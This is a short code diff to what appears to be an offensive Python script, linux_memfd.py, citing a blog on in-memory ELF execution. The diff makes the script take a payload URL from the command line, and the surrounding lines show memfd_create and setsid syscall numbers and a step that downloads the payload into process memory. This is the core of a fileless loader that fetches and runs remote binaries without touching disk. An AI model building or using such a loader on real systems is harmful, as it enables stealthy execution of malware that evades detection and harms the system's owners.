@@ -1,3 +1,5 @@
+# use: ./linux_memfd.py <url to elf>
+
 # largely based on: https://blog.fbkcs.ru/elf-in-memory-execution/
 
 # only using standard libraries
@@ -16,7 +18,7 @@ mfd_no = 319 if is64 else 356  # memfd_create
 ss_no = 112 if is64 else 66    # setsid
 
 # set URL for payload here
-url = <payload URL here>
+url = sys.argv[1]
 
 if __name__ == "__main__":
     # download payload into current process memory
